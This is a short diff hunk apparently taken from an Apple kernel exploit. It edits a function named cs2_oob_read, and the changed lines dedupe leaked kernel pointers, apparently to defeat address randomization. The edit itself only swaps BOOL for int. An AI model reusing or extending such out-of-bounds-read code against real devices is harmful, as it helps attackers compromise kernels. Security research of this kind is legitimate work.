@@ -239,9 +239,9 @@ kern_return_t cs2_oob_read(mach_port_t mo, mach_vm_offset_t mo_offset, uint64_t 
                         int distinct_n = 0;
                         uint64_t distinct[8] = {0};
                         for (int ki = 0; ki < kptr_seen_n; ki++) {
-                            BOOL dup = NO;
+                            int dup = 0;
                             for (int di = 0; di < distinct_n; di++)
-                                if (distinct[di] == kptr_seen[ki]) { dup = YES; break; }
+                                if (distinct[di] == kptr_seen[ki]) { dup = 1; break; }
                             if (!dup && distinct_n < 8) distinct[distinct_n++] = kptr_seen[ki];
                         }
                         if (distinct_n == 1 && kptr_n > kptr_seen_n) {
